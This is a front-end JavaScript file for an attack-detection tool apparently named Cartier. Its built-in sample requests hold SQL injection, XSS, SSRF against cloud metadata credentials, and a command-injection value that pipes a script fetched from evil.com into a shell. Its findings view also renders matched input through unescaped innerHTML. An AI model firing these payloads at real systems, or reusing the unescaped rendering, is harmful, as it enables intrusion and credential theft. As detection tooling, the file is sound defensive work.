const methodField = document.getElementById("method");
const urlField = document.getElementById("url");
const headersField = document.getElementById("headers");
const bodyField = document.getElementById("body");
const summaryEl = document.getElementById("summary");
const findingsEl = document.getElementById("findings");
const analyzeButton = document.getElementById("analyze");
const clearButton = document.getElementById("clear");

let samplesCache = {
  sqli: {
    method: "GET",
    url: "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  xss: {
    method: "GET",
    url: "https://shop.example.com/search?q=<script>alert(1)</script>",
    headers: "User-Agent: CartierTest\nAccept: */*",
    body: "",
  },
  ssrf: {
    method: "POST",
    url: "https://shop.example.com/fetch",
    headers: "Content-Type: application/json",
    body: '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
  },
  rce: {
    method: "POST",
    url: "https://shop.example.com/convert",
    headers: "Content-Type: application/x-www-form-urlencoded",
    body: "file=report.pdf;curl http://evil.com/s.sh|sh",
  },
};

async function loadSamples() {
  try {
    const response = await fetch("/api/samples");
    if (!response.ok) {
      return;
    }
    const data = await response.json();
    samplesCache = data;
  } catch (error) {
    // keep fallback samples
  }
}

function setSummary(summary) {
  if (!summary) {
    summaryEl.innerHTML = "<h3>No analysis yet</h3><p>Send a request to see detection results.</p>";
    return;
  }
  if (!summary.attack_detected) {
    summaryEl.innerHTML = "<h3>No attacks detected</h3><p>Cartier found no obvious attack indicators.</p>";
    return;
  }
  summaryEl.innerHTML = `<h3>Potential attacks detected</h3><p>${summary.count} categories flagged. Top: ${summary.top_attack}.</p>`;
}

function renderFindings(findings) {
  findingsEl.innerHTML = "";
  if (!findings || findings.length === 0) {
    findingsEl.innerHTML = "<p class=\"muted\">No findings yet.</p>";
    return;
  }
  findings.forEach((finding) => {
    const wrapper = document.createElement("div");
    wrapper.className = "finding";
    wrapper.innerHTML = `
      <h4>${finding.attack} <small>(${finding.confidence} confidence, score ${finding.score})</small></h4>
      <div class="evidence"></div>
    `;
    const evidenceContainer = wrapper.querySelector(".evidence");
    finding.evidence.forEach((item) => {
      const ev = document.createElement("div");
      ev.innerHTML = `<strong>${item.rule}</strong> — ${item.reason}<br/><span>${item.match}</span>`;
      evidenceContainer.appendChild(ev);
    });
    findingsEl.appendChild(wrapper);
  });
}

async function analyze() {
  const payload = {
    method: methodField.value,
    url: urlField.value.trim(),
    headers: headersField.value.trim(),
    body: bodyField.value.trim(),
  };

  summaryEl.innerHTML = "<h3>Analyzing...</h3><p>Cartier is inspecting the request.</p>";
  findingsEl.innerHTML = "";

  try {
    const response = await fetch("/api/analyze", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    setSummary(data.summary);
    renderFindings(data.findings);
  } catch (error) {
    summaryEl.innerHTML = "<h3>Error</h3><p>Could not reach the backend.</p>";
  }
}

function clearForm() {
  methodField.value = "GET";
  urlField.value = "";
  headersField.value = "";
  bodyField.value = "";
  setSummary(null);
  findingsEl.innerHTML = "";
}

function loadSample(key) {
  const sample = samplesCache[key];
  if (!sample) {
    return;
  }
  methodField.value = sample.method;
  urlField.value = sample.url;
  headersField.value = sample.headers;
  bodyField.value = sample.body;
  analyze();
}

analyzeButton.addEventListener("click", analyze);
clearButton.addEventListener("click", clearForm);

Array.from(document.querySelectorAll("[data-sample]")).forEach((button) => {
  button.addEventListener("click", () => loadSample(button.dataset.sample));
});

setSummary(null);
loadSamples();
